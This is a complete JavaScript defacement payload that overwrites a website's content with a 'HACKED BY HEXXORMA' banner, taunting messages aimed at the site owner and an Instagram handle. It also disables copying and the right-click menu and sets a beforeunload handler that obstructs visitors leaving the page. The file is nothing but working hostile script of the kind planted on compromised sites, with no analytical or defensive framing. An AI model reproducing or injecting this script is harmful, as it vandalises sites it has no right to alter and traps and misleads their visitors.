document.body.innerHTML = `
<div style="background:#000;color:#0f0;font-family:'Courier New',monospace;text-align:center;padding:20px;min-height:100vh;margin:0;display:flex;flex-direction:column;justify-content:center;align-items:center;overflow:hidden">
  <h1 style="color:#f00;font-size:12vw;margin:0;text-shadow:0 0 20px #f00,0 0 40px #f00;letter-spacing:8px">HEXXORMA</h1>
  <p style="color:#0f0;font-size:4vw;margin:20px 0;text-shadow:0 0 15px #0f0;font-style:italic">welcome, losers</p>
  <p style="color:#0f0;font-size:3vw;margin:10px 0">&gt; u seek all other</p>
  <div style="margin:30px 0">
    <p style="color:#0f0;font-size:3vw;margin:10px 0;text-shadow:0 0 10px #0f0">bro really thought his security was good</p>
    <p style="color:#0f0;font-size:3vw;margin:10px 0;text-shadow:0 0 10px #0f0">your site was easier than my morning coffee</p>
    <p style="color:#0f0;font-size:3vw;margin:10px 0;text-shadow:0 0 10px #0f0">thanks for hosting us for free</p>
    <p style="color:#0f0;font-size:3vw;margin:10px 0;text-shadow:0 0 10px #0f0">skill issue, not my problem</p>
    <p style="color:#0f0;font-size:3vw;margin:10px 0;text-shadow:0 0 10px #0f0">game over, losers</p>
  </div>
  <p style="color:#f00;font-size:5vw;margin:30px 0;font-weight:bold;text-shadow:0 0 20px #f00">YOUR WEBSITE OWNED BY HEXXORMA</p>
  <p style="color:#fff;font-size:3vw;margin:20px 0;text-shadow:0 0 10px #0f0">insta:flamingoxx4</p>
  <p style="color:#0f0;font-size:2vw;margin:20px 0;opacity:0.6">&gt; HexxorMA was here... and he ain't leaving</p>
</div>
`;
document.title = "HACKED BY HEXXORMA";
document.addEventListener('copy', e => e.preventDefault());
document.addEventListener('contextmenu', e => e.preventDefault());
window.addEventListener('beforeunload', function(e) {
  e.preventDefault();
  e.returnValue = '';
  return '';
});
